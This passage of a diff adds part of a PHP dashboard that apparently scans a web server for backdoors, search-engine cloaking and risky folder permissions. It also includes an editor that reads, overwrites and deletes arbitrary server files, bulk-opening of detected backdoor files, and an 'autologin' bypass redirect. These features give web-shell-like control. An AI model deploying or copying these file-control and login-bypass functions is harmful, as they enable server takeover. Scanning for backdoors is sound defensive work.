+                                    <button type="button" class="btn btn-sm btn-outline-success btn-open-sm" onclick="openSingleUrl('<?= htmlspecialchars($file_url) ?>')" title="Open in new tab">
+                                        <i class="fas fa-external-link-alt"></i>
+                                    </button>
+                                </div>
+                                <small class="text-muted d-block mt-1" style="font-size: 9px;"><?= htmlspecialchars($file) ?></small>
+                            </div>
+                            <?php endforeach; ?>
+                        <?php else: ?>
+                            <div class="list-group-item text-success bg-light text-center">
+                                <i class="fas fa-shield-alt fa-2x mb-2 d-block"></i>
+                                <strong>CLEAN</strong>
+                            </div>
+                        <?php endif; ?>
+                    </div>
+                    <?php if ($total_googlebot > $per_page): ?>
+                    <div class="pagination-container mt-2">
+                        <?= getPagination($total_googlebot, $per_page, $cpage, 'cpage', $path, $filter_name, $folder_mode, $selected_folder ?? '') ?>
+                    </div>
+                    <?php endif; ?>
+                </div>
+            </div>
+        </div>
+
+        <!-- Kolom 4: CHMOD Folder Risk -->
+        <div class="col-12 col-md-3">
+            <div class="card">
+                <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
+                    <h5 class="card-title mb-0"><i class="fas fa-folder me-2"></i>CHMOD Folder Risk</h5>
+                    <span class="stat-badge"><?= number_format($total_perms) ?> folders | Pg <?= $ppage ?></span>
+                </div>
+                <div class="card-body p-2">
+                    <div class="scrollable-list">
+                        <?php if (!empty($page_perms_data)): ?>
+                            <?php foreach ($page_perms_data as $item):
+                                $folder = $item['path'];
+                                $perms = $item['perms'];
+                                $reason = $item['reason'];
+                                $clean_perms = $item['clean_perms'];
+                                
+                                // Warna berdasarkan permission
+                                $bg_class = getPermClass($perms);
+                                $icon = '';
+                                switch ($clean_perms) {
+                                    case '555': $icon = '🟡'; break;
+                                    case '444': $icon = '🟡'; break;
+                                    case '111': $icon = '🟡'; break;
+                                    case '000': $icon = '⚫'; break;
+                                    default: $icon = '📁';
+                                }
+                                
+                                // Link untuk view folder
+                                $view_link = "?path=" . urlencode($folder);
+                            ?>
+                            <div class="list-group-item <?= $bg_class ?>" style="border-left-width: 4px;">
+                                <div class="d-flex justify-content-between align-items-start">
+                                    <div>
+                                        <a href="<?= $view_link ?>" class="text-dark text-decoration-none">
+                                            <i class="fas fa-folder me-1"></i>
+                                            <strong><?= htmlspecialchars(basename($folder)) ?></strong>
+                                        </a>
+                                        <div class="mt-1">
+                                            <span class="badge-perm badge-perm-<?= $clean_perms ?>"><?= $icon ?> <?= $perms ?></span>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <form method="post" class="d-inline" onsubmit="return confirm('Change permission of folder <?= htmlspecialchars(basename($folder)) ?>?')">
+                                            <input type="hidden" name="chmod_folder" value="<?= htmlspecialchars($folder) ?>">
+                                            <select name="new_perms" class="form-select form-select-sm d-inline-block w-auto" style="font-size: 11px; padding: 2px 5px;">
+                                                <option value="0755">755 (rwxr-xr-x) - Standard</option>
+                                                <option value="0750">750 (rwxr-x---) - More Secure</option>
+                                                <option value="0700">700 (rwx------) - Most Secure</option>
+                                            </select>
+                                            <button type="submit" class="btn btn-sm btn-outline-secondary mt-1"><i class="fas fa-sync-alt"></i> Fix</button>
+                                        </form>
+                                    </div>
+                                </div>
+                                <small class="text-danger d-block mt-1" style="font-size: 10px;">⚠️ <?= htmlspecialchars($reason) ?></small>
+                                <small class="text-muted d-block mt-1" style="font-size: 9px;">📂 <?= htmlspecialchars($folder) ?></small>
+                            </div>
+                            <?php endforeach; ?>
+                        <?php else: ?>
+                            <div class="list-group-item text-success bg-light text-center">
+                                <i class="fas fa-shield-alt fa-2x mb-2 d-block"></i>
+                                <strong>SECURE</strong><br>
+                                <small>No dangerous folder permissions</small>
+                            </div>
+                        <?php endif; ?>
+                    </div>
+                    <?php if ($total_perms > $per_page): ?>
+                    <div class="pagination-container mt-2">
+                        <?= getPagination($total_perms, $per_page, $ppage, 'ppage', $path, $filter_name, $folder_mode, $selected_folder ?? '') ?>
+                    </div>
+                    <?php endif; ?>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Row 2: Editor -->
+    <div class="row g-3">
+        <div class="col-12">
+            <div class="card">
+                <div class="card-header bg-secondary text-white d-flex justify-content-between align-items-center">
+                    <div>
+                        <i class="fas fa-code me-2"></i><strong>Script Editor</strong>
+                        <?php if (!empty($view)): ?>
+                            <span class="ms-2 stat-badge"><?= htmlspecialchars(basename($view)) ?></span>
+                            <span class="stat-badge"><?= number_format(filesize($view) / 1024, 1) ?> KB</span>
+                        <?php endif; ?>
+                    </div>
+                    <?php if (!empty($view)): ?>
+                        <button class="btn btn-sm btn-outline-light" onclick="toggleEdit()" id="toggle-btn"><i class="fas fa-edit me-1"></i>Edit</button>
+                    <?php endif; ?>
+                </div>
+                <div class="card-body p-3">
+                    <?php if (!empty($view)): ?>
+                        <textarea id="edit-content" class="form-control" readonly><?= htmlspecialchars(file_get_contents($view)) ?></textarea>
+                    <?php else: ?>
+                        <div class="text-center text-muted py-5">
+                            <i class="fas fa-file-code fa-4x mb-3 opacity-25"></i>
+                            <h5>No File Selected</h5>
+                            <p class="small">Click on any file from Backdoor or Cloaking section</p>
+                        </div>
+                    <?php endif; ?>
+                </div>
+                <?php if (!empty($view)): ?>
+                <div class="card-footer bg-light d-flex justify-content-between align-items-center">
+                    <form method="post" id="save-form" class="d-inline">
+                        <input type="hidden" name="edit_file" value="<?= htmlspecialchars($view) ?>">
+                        <textarea name="file_content" style="display:none;" id="hidden-content"><?= htmlspecialchars(file_get_contents($view)) ?></textarea>
+                        <button type="submit" class="btn btn-success btn-sm"><i class="fas fa-save me-1"></i>Save</button>
+                    </form>
+                    <div class="btn-group">
+                        <button onclick="copyAll()" class="btn btn-outline-secondary btn-sm"><i class="fas fa-copy me-1"></i>Copy All</button>
+                        <form method="post" class="d-inline" onsubmit="return confirm('Delete <?= htmlspecialchars(basename($view)) ?> ?')">
+                            <input type="hidden" name="delete_file" value="<?= htmlspecialchars($view) ?>">
+                            <button type="submit" class="btn btn-danger btn-sm"><i class="fas fa-trash me-1"></i>Delete</button>
+                        </form>
+                        <a href="<?= htmlspecialchars(showFileUrl($view)) ?>" target="_blank" class="btn btn-outline-primary btn-sm"><i class="fas fa-external-link-alt me-1"></i>Open</a>
+                    </div>
+                </div>
+                <?php endif; ?>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+let currentUrl = <?= json_encode(!empty($view) ? showFileUrl($view) : '') ?>;
+let currentFilePath = <?= json_encode($view ?? '') ?>;
+
+function openPreview() { if (currentUrl) window.open(currentUrl, '_blank'); else alert('No file selected'); }
+function copyUrl() { if (currentUrl) navigator.clipboard.writeText(currentUrl).then(() => alert('✅ URL copied!')); }
+function autoLoginBypass() { if (currentFilePath) window.location.href = '?action=autologin&target=' + encodeURIComponent(currentFilePath); }
+
+function toggleEdit() {
+    let ta = document.getElementById('edit-content'), btn = document.getElementById('toggle-btn');
+    if (ta && btn) { 
+        ta.readOnly = !ta.readOnly; 
+        ta.classList.toggle('textarea-editable', !ta.readOnly);
+        btn.innerHTML = ta.readOnly ? '<i class="fas fa-edit me-1"></i>Edit' : '<i class="fas fa-save me-1"></i>Readonly'; 
+    }
+}
+
+function copyAll() {
+    let ta = document.getElementById('edit-content');
+    if (ta) navigator.clipboard.writeText(ta.value).then(() => alert('✅ Content copied!'));
+}
+
+// ========== FUNGSI OPEN URL ==========
+function openSingleUrl(url) {
+    if (url) {
+        window.open(url, '_blank');
+    } else {
+        alert('URL tidak valid');
+    }
+}
+
+// ========== BULK OPEN BACKDOOR ==========
+function selectAllBackdoor() {
+    const checkboxes = document.querySelectorAll('.backdoor-checkbox');
+    checkboxes.forEach(cb => cb.checked = true);
+    updateSelectedCountBackdoor();
+}
+
+function unselectAllBackdoor() {
+    const checkboxes = document.querySelectorAll('.backdoor-checkbox');
+    checkboxes.forEach(cb => cb.checked = false);
+    updateSelectedCountBackdoor();
+}
+
+function updateSelectedCountBackdoor() {
+    const checkboxes = document.querySelectorAll('.backdoor-checkbox:checked');
+    const countSpan = document.getElementById('selectedCountBackdoor');
+    if (countSpan) countSpan.innerText = checkboxes.length;
+}
+
+function openSelectedBackdoor() {
+    const checkboxes = document.querySelectorAll('.backdoor-checkbox:checked');
+    const count = checkboxes.length;
+    
+    if (count === 0) {
+        alert('⚠️ Pilih minimal 1 file untuk dibuka!');
+        return false;
+    }
+    
+    let message = `🚀 Akan membuka ${count} file di tab baru.\n\n`;
+    if (count > 10) {
+        message += `⚠️ PERINGATAN: Membuka ${count} tab sekaligus bisa memperlambat browser!\n`;
+        message += `Browser mungkin memblokir popup.\n\n`;
+    }
+    message += `Lanjutkan?`;
+    
+    if (confirm(message)) {
+        const urls = [];
+        checkboxes.forEach(cb => {
+            let url = cb.getAttribute('data-url');
+            if (url) urls.push(url);
+        });
+        
+        for (let i = 0; i < urls.length; i++) {
+            setTimeout(function() {
+                window.open(urls[i], '_blank');
+            }, i * 150);
+        }
+        
+        alert(`✅ ${urls.length} file sedang dibuka di tab baru!`);
+    }
+    return false;
+}
+
+// Event listener untuk update counter
+document.addEventListener('DOMContentLoaded', function() {
+    const checkboxes = document.querySelectorAll('.backdoor-checkbox');
+    checkboxes.forEach(cb => cb.addEventListener('change', updateSelectedCountBackdoor));
+    updateSelectedCountBackdoor();
+});
+
+// Auto-save hidden content before submit
+document.getElementById('save-form')?.addEventListener('submit', function() {
+    let editor = document.getElementById('edit-content'), hidden = document.getElementById('hidden-content');
+    if (editor && hidden) hidden.value = editor.value;
+});
+
+// Auto-dismiss alerts
+setTimeout(() => {
+    document.querySelectorAll('.alert').forEach(alert => {
+        let bsAlert = new bootstrap.Alert(alert);
+        setTimeout(() => bsAlert.close(), 3000);
+    });
+}, 100);
+</script>
+</body>
+</html>
